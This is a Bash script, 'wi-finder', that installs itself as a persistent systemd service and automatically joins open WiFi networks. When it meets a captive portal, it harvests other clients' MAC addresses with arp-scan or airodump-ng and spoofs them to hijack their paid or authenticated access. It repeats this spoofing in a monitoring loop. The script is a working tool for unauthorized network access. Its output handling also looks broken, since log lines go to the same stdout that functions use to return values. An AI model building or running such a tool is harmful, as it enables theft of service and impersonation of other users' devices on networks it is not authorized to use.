#!/usr/bin/env bash

# Exit immediately if a command fails
set -o errexit
# Exit if any undefined variable is used
set -o nounset
# Exit if any part of a pipeline fails
set -o pipefail

CONFIG_FILE="/etc/wi-finder.conf"
LOG_FILE="/var/log/wi-finder.log"

# Load config if exists
[ -f "$CONFIG_FILE" ] && source "$CONFIG_FILE"

# Set defaults
: ${RETRY_DELAY:=10}
: ${INITIAL_WAIT:=30}
: ${DNS_SERVERS:="1.1.1.1 8.8.8.8 9.9.9.9"}
: ${LOG_LEVEL:=2} # 0=error, 1=warn, 2=info, 3=debug
: ${LOG_MAX_SIZE:=1048576} # 1MB
: ${LOG_BACKUP_COUNT:=3}

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" >&2
    exit 1
fi

# Logging function
# Setup log rotation
rotate_logs() {
    if [ -f "$LOG_FILE" ]; then
        local size=$(stat -c %s "$LOG_FILE" 2>/dev/null || stat -f %z "$LOG_FILE")
        if [ "$size" -gt "$LOG_MAX_SIZE" ]; then
            for i in $(seq $LOG_BACKUP_COUNT -1 1); do
                [ -f "${LOG_FILE}.$i" ] && mv "${LOG_FILE}.$i" "${LOG_FILE}.$((i+1))"
            done
            mv "$LOG_FILE" "${LOG_FILE}.1"
        fi
    fi
}

log() {
    local level=$1
    local message=$2
    local timestamp=$(date +"%Y-%m-%d %T")
    
    # Map level names to numbers
    case $level in
        error) level_num=0;;
        warn)  level_num=1;;
        info)  level_num=2;;
        debug) level_num=3;;
        *)     level_num=2;; # Default to info
    esac
    
    # Only log if level is <= configured LOG_LEVEL
    if [ $level_num -le $LOG_LEVEL ]; then
        rotate_logs
        echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
    fi
}

# Redirect all output to log function
exec 3>&1 4>&2
exec 1> >(while read -r line; do log "info" "$line"; done)
exec 2> >(while read -r line; do log "error" "$line"; done)

log "info" "••¤(×[¤ wi-finder 1.1 by J0hnnyXm4s ¤]×)¤••"
log "info" ""

# Enable debug mode if DEBUG is set
if [ "${DEBUG:-0}" -eq 1 ]; then
    set -o xtrace
    LOG_LEVEL=3 # Force debug logging when in debug mode
fi

detect_network_service() {
    if systemctl list-unit-files systemd-networkd.service >/dev/null 2>&1; then
        echo "systemd-networkd"
    elif command -v NetworkManager >/dev/null 2>&1; then
        echo "network-manager"
    else
        log "error" "No supported network management service found (systemd-networkd or NetworkManager)"
        log "error" "Please install systemd or ensure NetworkManager is available"
        exit 1
    fi
}

detect_dhcp_client() {
    if command -v dhclient >/dev/null 2>&1; then
        echo "dhclient"
    elif command -v dhcpcd >/dev/null 2>&1; then
        echo "dhcpcd"
    else
        log "error" "No DHCP client found (dhclient or dhcpcd)"
        log "error" "Please install dhcpcd-base package"
        exit 1
    fi
}

get_dhcp_package() {
    # Always return dhcpcd-base as the package to install
    echo "dhcpcd-base"
}

install_dependencies() {
    log "info" "=== DEPENDENCY CHECK ==="
    NETWORK_SERVICE=$(detect_network_service)
    DHCP_CLIENT=$(detect_dhcp_client)
    DHCP_PACKAGE=$(get_dhcp_package)
    
    # Define packages to install (never install NetworkManager)
    local base_pkgs=("iw" "wireless-tools" "iputils-ping" "curl" "arp-scan" "macchanger" "aircrack-ng")
    local pkgs=("${base_pkgs[@]}")
    
    # Add DHCP client package
    pkgs+=("$DHCP_PACKAGE")
    
    # Verify NetworkManager is not in our install list
    if [ "$NETWORK_SERVICE" = "network-manager" ]; then
        log "info" "Using existing NetworkManager installation (will not install)"
        if ! command -v NetworkManager >/dev/null 2>&1; then
            log "error" "NetworkManager selected but not found on system"
            exit 1
        fi
    fi
    
    local missing=()
    
    log "info" "Checking for required packages..."
    for pkg in "${pkgs[@]}"; do
        if ! dpkg -s "$pkg" >/dev/null 2>&1; then
            missing+=("$pkg")
            log "warn" "Missing package: $pkg"
        else
            log "debug" "Found package: $pkg"
        fi
    done
    
    # Verify systemd-networkd service availability (already checked in detect_network_service)
    if [ "$NETWORK_SERVICE" = "systemd-networkd" ]; then
        log "debug" "Using systemd-networkd service"
    fi

    if [ ${#missing[@]} -ne 0 ]; then
        log "info" "DEPENDENCY INSTALL: Installing ${#missing[@]} missing packages: ${missing[*]}"
        if apt-get update && apt-get install -y "${missing[@]}"; then
            log "info" "SUCCESS: All dependencies installed successfully"
        else
            log "error" "FAILURE: Failed to install required packages"
            exit 1
        fi
    else
        log "info" "SUCCESS: All dependencies already installed"
    fi
}

check_internet() {
    if verify_internet; then
        log "info" "Already connected to internet, starting monitoring mode"
        return 0
    fi
    return 1
}

create_systemd_service() {
    local script_path=$(realpath "$0")
    local service_file="/etc/systemd/system/wi-finder.service"
    
    cat > "$service_file" <<EOF
[Unit]
Description=Auto connect to open WiFi networks
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$script_path
Restart=on-failure
RestartSec=5s
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable wi-finder
    log "info" "Created systemd service at $service_file"
}

start_service() {
    log "info" "Starting wi-finder service..."
    if systemctl start wi-finder; then
        log "info" "wi-finder service started successfully"
        if systemctl is-active --quiet wi-finder; then
            log "info" "Service is running"
        else
            log "error" "Service failed to start properly"
            exit 1
        fi
    else
        log "error" "Failed to start wi-finder service"
        exit 1
    fi
}

setup() {
    log "info" "Setting up WiFi Autoconnect script..."
    install_dependencies
    create_systemd_service
    start_service
}

# Check if running as service setup or main execution
if [ "${1:-}" = "--setup" ]; then
    setup
    exit 0
fi

# If service doesn't exist, set it up first
if [ ! -f "/etc/systemd/system/wi-finder.service" ]; then
    setup
    exit 0
fi

find_wifi_interface() {
    # Get list of wireless interfaces using ip command
    local interfaces=($(ip -o link show | awk -F': ' '$2 ~ /^wl/ {print $2}'))
    
    # Fallback to iw if ip command fails
    if [ ${#interfaces[@]} -eq 0 ]; then
        interfaces=($(iw dev | awk '/Interface/ {print $2}'))
    fi
    
    # Check each interface for association state
    for interface in "${interfaces[@]}"; do
        local state=$(iw dev "$interface" link 2>/dev/null | grep -q "Connected to" && echo "connected" || echo "disconnected")
        
        if [ "$state" = "disconnected" ]; then
            WIFI_INTERFACE="$interface"
            log "debug" "Found available interface: $interface"
            return 0
        fi
    done
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        log "error" "No WiFi interfaces detected"
    else
        log "warn" "All WiFi interfaces are already connected"
    fi
    
    # Wait and retry if no available interface found
    log "info" "Waiting $RETRY_DELAY seconds before retrying..."
    sleep "$RETRY_DELAY"
    find_wifi_interface
}

scan_open_networks() {
    local interface=$1
    log "info" "Starting WiFi scan on interface $interface"
    
    # Scan and sort by signal strength (strongest first)
    local scan_result
    scan_result=$(iw dev "$interface" scan 2>&1)
    if [ $? -ne 0 ]; then
        log "error" "WiFi scan failed: $scan_result"
        return 1
    fi
    
    local networks
    networks=$(echo "$scan_result" | \
        awk '
        /^BSS/ { bss = $2 }
        /SSID:/ {
            gsub(/.*SSID: /, "");
            gsub(/\t/, "");
            if ($0 != "") ssid = $0
        }
        /signal:/ {
            gsub(/.*signal: /, "");
            gsub(/ dBm.*/, "");
            signal = $0
        }
        /capability:.*Privacy/ { privacy = 1 }
        /capability:/ && !/Privacy/ {
            if (ssid && !privacy && signal) {
                print signal " " ssid
            }
            ssid = ""; signal = ""; privacy = 0
        }' | \
        sort -nr | \
        awk '{$1=""; print substr($0,2)}')
    
    local network_count=$(echo "$networks" | wc -l)
    if [ -n "$networks" ] && [ "$network_count" -gt 0 ]; then
        log "info" "Found $network_count open networks:"
        echo "$networks" | while read -r network; do
            [ -n "$network" ] && log "info" "  - $network"
        done
    else
        log "warn" "No open networks found in scan"
    fi
    
    echo "$networks"
}

connect_to_network() {
    local interface=$1
    local ssid=$2
    
    log "info" "ATTEMPT: Connecting to network '$ssid' on interface $interface"
    
    cleanup_interface "$interface"
    
    log "debug" "Bringing up interface $interface"
    if ! ifconfig "$interface" up; then
        log "error" "FAILURE: Failed to bring up interface $interface"
        return 1
    fi
    
    log "info" "Associating with SSID: $ssid"
    if [ "$NETWORK_SERVICE" = "systemd-networkd" ]; then
        if ! iwconfig "$interface" essid "$ssid" 2>&1; then
            log "error" "FAILURE: Failed to associate with SSID '$ssid' using iwconfig"
            return 1
        fi
    else
        if ! nmcli dev wifi connect "$ssid" ifname "$interface" 2>&1; then
            log "error" "FAILURE: Failed to connect to SSID '$ssid' using NetworkManager"
            return 1
        fi
    fi
    
    log "info" "Association successful, requesting DHCP lease for $ssid"
    if ! $DHCP_CLIENT "$interface" 2>&1; then
        log "error" "FAILURE: Failed to get DHCP lease for network '$ssid'"
        return 1
    fi
    
    log "info" "SUCCESS: Connected to network '$ssid' and obtained IP address"
    return 0
}

check_captive_portal() {
    log "info" "ATTEMPT: Testing for captive portal using neverssl.com"
    local response
    response=$(curl -s --max-time 5 http://neverssl.com 2>&1 || true)
    
    if [ -z "$response" ]; then
        log "error" "FAILURE: No response from neverssl.com - possible connectivity issue"
        return 1
    fi
    
    if echo "$response" | grep -q "This website is for when you try to open Facebook"; then
        log "info" "SUCCESS: neverssl test passed - no captive portal detected"
        return 0  # No captive portal - test succeeded
    else
        log "warn" "FAILURE: neverssl test failed - captive portal detected or blocked"
        log "debug" "Response received: ${response:0:200}..."  # Log first 200 chars
        return 1  # Captive portal detected - test failed
    fi
}

get_mac_addresses() {
    local interface=$1
    local macs=()
    
    log "info" "ATTEMPT: Discovering MAC addresses of connected clients"
    
    # Try arp-scan first
    if command -v arp-scan >/dev/null 2>&1; then
        log "debug" "Using arp-scan to discover MAC addresses"
        local arp_result
        arp_result=$(arp-scan --interface="$interface" --localnet 2>&1)
        if [ $? -eq 0 ]; then
            while IFS= read -r line; do
                local mac=$(echo "$line" | awk '{print $2}')
                if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                    macs+=("$mac")
                    log "debug" "Found MAC address via arp-scan: $mac"
                fi
            done < <(echo "$arp_result" | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
        else
            log "warn" "arp-scan failed: $arp_result"
        fi
    else
        log "debug" "arp-scan not available"
    fi
    
    # Fall back to airodump-ng if no results
    if [ ${#macs[@]} -eq 0 ] && command -v airodump-ng >/dev/null 2>&1; then
        log "debug" "Falling back to airodump-ng for MAC discovery"
        local airodump_result
        airodump_result=$(timeout 10 airodump-ng "$interface" 2>&1 | head -20)
        if [ $? -eq 0 ]; then
            while IFS= read -r line; do
                local mac=$(echo "$line" | awk '{print $1}')
                if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$line" != *"BSSID"* ]]; then
                    macs+=("$mac")
                    log "debug" "Found MAC address via airodump-ng: $mac"
                fi
            done < <(echo "$airodump_result" | grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
        else
            log "warn" "airodump-ng failed or timed out"
        fi
    elif [ ${#macs[@]} -eq 0 ]; then
        log "debug" "airodump-ng not available"
    fi
    
    if [ ${#macs[@]} -gt 0 ]; then
        log "info" "SUCCESS: Discovered ${#macs[@]} MAC addresses for spoofing"
    else
        log "warn" "FAILURE: No MAC addresses discovered for spoofing"
    fi
    
    echo "${macs[@]}"
}

spoof_mac() {
    local interface=$1
    local mac=$2
    
    log "info" "ATTEMPT: Spoofing MAC address to $mac on interface $interface"
    
    # Get current MAC for comparison
    local current_mac=$(ip link show "$interface" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)
    log "debug" "Current MAC address: $current_mac"
    
    # Bring interface down first
    if ! ip link set dev "$interface" down 2>&1; then
        log "error" "FAILURE: Could not bring interface $interface down for MAC spoofing"
        return 1
    fi
    
    local spoof_result
    if command -v macchanger >/dev/null 2>&1; then
        log "debug" "Using macchanger for MAC spoofing"
        spoof_result=$(macchanger -m "$mac" "$interface" 2>&1)
        if [ $? -ne 0 ]; then
            log "error" "FAILURE: macchanger failed: $spoof_result"
            ip link set dev "$interface" up
            return 1
        fi
    else
        log "debug" "Using ip command for MAC spoofing"
        spoof_result=$(ip link set dev "$interface" address "$mac" 2>&1)
        if [ $? -ne 0 ]; then
            log "error" "FAILURE: ip command MAC spoofing failed: $spoof_result"
            ip link set dev "$interface" up
            return 1
        fi
    fi
    
    # Bring interface back up
    if ! ip link set dev "$interface" up 2>&1; then
        log "error" "FAILURE: Could not bring interface $interface up after MAC spoofing"
        return 1
    fi
    
    sleep 2  # Give interface time to come up
    
    # Verify MAC change
    local new_mac=$(ip link show "$interface" | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)
    if [ "$new_mac" = "$mac" ]; then
        log "info" "SUCCESS: MAC address successfully changed from $current_mac to $new_mac"
        return 0
    else
        log "error" "FAILURE: MAC spoofing verification failed. Expected: $mac, Got: $new_mac"
        return 1
    fi
}

verify_internet() {
    # First do the neverssl test as specified in the flow
    if check_captive_portal; then
        log "info" "neverssl test succeeded - internet access confirmed"
        return 0
    else
        log "warn" "neverssl test failed - captive portal detected or no internet"
        return 1
    fi
}

cleanup_interface() {
    local interface=$1
    log "debug" "Cleaning up interface $interface"
    dhclient -r "$interface" >/dev/null 2>&1
    ifconfig "$interface" down >/dev/null 2>&1
}

# Cleanup on exit or interrupt
cleanup() {
    local interface=$1
    log "info" "Performing final cleanup..."
    cleanup_interface "$interface"
    exit 0
}

scan_and_connect() {
    local interface=$1
    local scan_attempt=1
    
    while true; do
        log "info" "=== SCAN ATTEMPT #$scan_attempt ==="
        log "info" "Scanning for open networks on interface $interface..."
        
        networks=($(scan_open_networks "$interface"))
        if [ ${#networks[@]} -eq 0 ]; then
            log "warn" "SCAN RESULT: No open networks found in attempt #$scan_attempt"
            log "info" "Waiting 60 seconds before next scan attempt..."
            sleep 60
            ((scan_attempt++))
            continue
        fi

        log "info" "SCAN RESULT: Found ${#networks[@]} open networks to try"
        local network_num=1
        
        for network in "${networks[@]}"; do
            [ -z "$network" ] && continue
            
            log "info" "=== NETWORK $network_num/${#networks[@]}: '$network' ==="
            
            # Initial connection attempt
            if connect_to_network "$interface" "$network"; then
                log "info" "Network connection established, testing internet access..."
                
                if verify_internet; then
                    log "info" "SUCCESS: Connected to '$network' with full internet access!"
                    log "info" "=== CONNECTION SUCCESSFUL - ENTERING MONITORING MODE ==="
                    return 0
                else
                    log "warn" "CAPTIVE PORTAL DETECTED: Network '$network' requires bypass"
                    log "info" "Starting MAC spoofing bypass procedure..."
                    
                    # Get unique MAC addresses and validate format
                    declare -A unique_macs
                    for mac in $(get_mac_addresses "$interface"); do
                        if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                            unique_macs["$mac"]=1
                        fi
                    done
                    
                    if [ ${#unique_macs[@]} -eq 0 ]; then
                        log "warn" "BYPASS FAILED: No valid MAC addresses found for spoofing on '$network'"
                        cleanup_interface "$interface"
                        ((network_num++))
                        continue
                    fi
                    
                    macs=("${!unique_macs[@]}")
                    log "info" "Attempting captive portal bypass with ${#macs[@]} discovered MAC addresses"
                    
                    local mac_num=1
                    for mac in "${macs[@]}"; do
                        log "info" "MAC SPOOF ATTEMPT $mac_num/${#macs[@]}: $mac on network '$network'"
                        
                        if spoof_mac "$interface" "$mac"; then
                            if connect_to_network "$interface" "$network"; then
                                if verify_internet; then
                                    log "info" "SUCCESS: Bypassed captive portal on '$network' using MAC $mac"
                                    log "info" "=== CAPTIVE PORTAL BYPASS SUCCESSFUL - ENTERING MONITORING MODE ==="
                                    return 0
                                else
                                    log "warn" "BYPASS ATTEMPT FAILED: MAC $mac did not provide internet access on '$network'"
                                fi
                            else
                                log "warn" "BYPASS ATTEMPT FAILED: Could not reconnect to '$network' with MAC $mac"
                            fi
                        else
                            log "warn" "BYPASS ATTEMPT FAILED: MAC spoofing to $mac failed"
                        fi
                        
                        cleanup_interface "$interface"
                        ((mac_num++))
                    done
                    
                    log "error" "BYPASS FAILED: All MAC spoofing attempts failed for network '$network'"
                fi
            else
                log "error" "CONNECTION FAILED: Could not connect to network '$network'"
            fi
            
            cleanup_interface "$interface"
            ((network_num++))
        done
        
        log "warn" "SCAN ATTEMPT #$scan_attempt FAILED: No networks provided internet access"
        log "info" "Waiting 60 seconds before next scan attempt..."
        sleep 60
        ((scan_attempt++))
    done
}

monitoring_loop() {
    local interface=$1
    local heartbeat_count=1
    
    log "info" "=== ENTERING MONITORING MODE ==="
    log "info" "Will perform heartbeat checks every 30 minutes"
    
    while true; do
        log "info" "=== HEARTBEAT CHECK #$heartbeat_count ==="
        log "info" "Sleeping for 30 minutes before next connectivity check..."
        sleep 1800  # 30 minutes = 1800 seconds
        
        log "info" "HEARTBEAT: Performing connectivity check #$heartbeat_count"
        log "info" "HEARTBEAT: Pinging Google.com..."
        
        local ping_result
        ping_result=$(ping -c 1 -W 5 google.com 2>&1)
        if [ $? -eq 0 ]; then
            log "info" "HEARTBEAT SUCCESS: Google.com ping successful"
            log "info" "HEARTBEAT: Connection is healthy, continuing monitoring"
        else
            log "warn" "HEARTBEAT FAILURE: Google.com ping failed - $ping_result"
            log "warn" "HEARTBEAT: Performing secondary neverssl test..."
            
            if ! verify_internet; then
                log "error" "CONNECTIVITY LOST: Both ping and neverssl tests failed"
                current_ssid=$(iwgetid -r "$interface" 2>/dev/null || echo "")
                
                if [ -n "$current_ssid" ]; then
                    log "info" "RECOVERY ATTEMPT: Trying MAC spoofing on current network '$current_ssid'"
                    
                    # Get unique MAC addresses and validate format
                    declare -A unique_macs
                    for mac in $(get_mac_addresses "$interface"); do
                        if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                            unique_macs["$mac"]=1
                        fi
                    done
                    
                    if [ ${#unique_macs[@]} -gt 0 ]; then
                        macs=("${!unique_macs[@]}")
                        log "info" "RECOVERY: Attempting MAC spoofing with ${#macs[@]} discovered addresses"
                        
                        local recovery_mac_num=1
                        for mac in "${macs[@]}"; do
                            log "info" "RECOVERY MAC ATTEMPT $recovery_mac_num/${#macs[@]}: $mac on '$current_ssid'"
                            
                            if spoof_mac "$interface" "$mac"; then
                                if connect_to_network "$interface" "$current_ssid"; then
                                    if verify_internet; then
                                        log "info" "RECOVERY SUCCESS: Connection restored with MAC $mac on '$current_ssid'"
                                        ((heartbeat_count++))
                                        continue 2  # Continue outer monitoring loop
                                    fi
                                fi
                            fi
                            cleanup_interface "$interface"
                            ((recovery_mac_num++))
                        done
                        
                        log "warn" "RECOVERY FAILED: MAC spoofing could not restore connection to '$current_ssid'"
                    else
                        log "warn" "RECOVERY FAILED: No MAC addresses available for spoofing"
                    fi
                else
                    log "warn" "RECOVERY FAILED: Could not determine current SSID"
                fi
                
                log "warn" "FULL RECOVERY: Starting complete scan and connect process"
                cleanup_interface "$interface"
                
                # Re-detect interface in case it changed
                interface=$(find_wifi_interface)
                
                # Attempt to reconnect
                if scan_and_connect "$interface"; then
                    log "info" "FULL RECOVERY SUCCESS: Reconnected to internet via new network"
                else
                    log "error" "FULL RECOVERY FAILED: Could not reconnect, will retry in 30 minutes"
                fi
            else
                log "info" "HEARTBEAT RECOVERY: neverssl test passed, connection restored"
            fi
        fi
        
        ((heartbeat_count++))
    done
}

main() {
    log "info" "=== WI-FINDER MAIN EXECUTION START ==="
    
    # Setup traps for clean exit
    trap 'cleanup "$interface"' EXIT
    trap 'log "warn" "Received interrupt, cleaning up..."; cleanup "$interface"' INT TERM
        
    log "info" "STARTUP: Waiting $INITIAL_WAIT seconds for any predefined network connections..."
    sleep "$INITIAL_WAIT"
    
    # Check if already connected to internet
    log "info" "STARTUP: Checking if already connected to internet..."
    if check_internet; then
        log "info" "STARTUP: Already connected to internet, finding interface for monitoring..."
        interface=$(find_wifi_interface)
        log "info" "STARTUP: Using interface $interface for monitoring"
        monitoring_loop "$interface"
        exit 0
    fi
    
    log "info" "STARTUP: No internet connection detected, starting WiFi discovery process..."
    interface=$(find_wifi_interface)
    log "info" "STARTUP: Using interface $interface for WiFi connection attempts"

    # Attempt initial connection
    log "info" "STARTUP: Beginning scan and connect process..."
    if scan_and_connect "$interface"; then
        log "info" "STARTUP SUCCESS: Initial connection successful, entering monitoring mode"
        monitoring_loop "$interface"
    else
        log "error" "STARTUP FAILURE: Initial connection failed, exiting"
        exit 1
    fi
}

main "$@"